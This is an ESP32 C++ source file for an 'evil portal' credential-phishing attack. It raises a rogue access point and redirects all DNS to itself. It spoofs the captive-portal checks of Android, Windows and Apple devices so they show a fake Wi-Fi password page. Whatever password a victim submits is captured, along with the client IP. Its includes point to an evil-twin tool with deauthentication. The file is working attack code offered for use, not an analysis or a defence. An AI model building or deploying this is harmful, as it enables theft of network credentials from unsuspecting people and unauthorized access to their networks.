#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include "config.h"
#include "evil_portal.h"
#include "deauth.h"

static const IPAddress AP_IP(192, 168, 4, 1);
static const byte DNS_PORT = 53;
static DNSServer dnsServer;
static AsyncWebServer server(80);

bool portalRunning = false;
bool isCaptured = false;
String client_password;
String client_ip;

void startCaptivePortal(String* ssid) {
  if (portalRunning) return;

  WiFi.softAP(*ssid);
  delay(100);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", AP_IP);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    String html = R"rawliteral(
      <!DOCTYPE html>
      <html>
      <head><title>Login</title></head>
      <body>
        <h2>Enter Wi-Fi Password</h2>
        <form action="/login" method="POST">
          Password: <input type="password" name="password"><br><br>
          <input type="submit" value="Login">
        </form>
      </body>
      </html>
    )rawliteral";
    request->send(200, "text/html", html);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
    String password;
    if (request->hasParam("password", true)) {
      password = request->getParam("password", true)->value();
    }

    IPAddress clientIP = request->client()->remoteIP();
    String mac = WiFi.BSSIDstr();  
    request->send(200, "text/html", "<h3>Connecting...</h3><p>Please wait...</p>");
    client_password = password;
    client_ip = clientIP.toString();
    isCaptured = true;
    delay(300);
  });

  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(204, "text/plain", "");
  });

  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Microsoft NCSI");
  });

  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Microsoft Connect Test");
  });

  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.begin();
  portalRunning = true;
}

void updateCaptivePortal() {
  dnsServer.processNextRequest();
}

void stopCaptivePortal() {
  if (!portalRunning) return;

  dnsServer.stop();
  server.end();
  delay(100);
  WiFi.softAPdisconnect(true);

  portalRunning = false;
  isCaptured = false;
}
